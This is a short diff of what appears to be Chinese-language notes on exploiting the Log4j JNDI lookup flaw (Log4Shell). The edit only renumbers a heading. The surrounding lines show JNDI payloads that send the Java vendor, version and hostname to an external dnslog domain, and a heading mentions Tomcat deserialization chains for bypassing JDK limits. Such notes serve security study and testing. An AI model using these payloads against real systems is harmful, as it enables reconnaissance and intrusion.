@@ -47,7 +47,7 @@ ${jndi:ldap://${sys:java.vendor}.domain/a}
 ```
 ${jndi:ldap://${sys:java.vendor}.@.${sys:java.version}.@.${hostName}.test.dnslog.cn/exp}
 ```
-### 其他可探测的信息
+### 4.3 其他可探测的信息
 ![Image](https://pbs.twimg.com/media/FGT0Im-UcAIq7IA?format=png&name=small)
 ### 4.3 使用tomcat等可绕过高版本jdk限制的反序列化链
 可以使用 
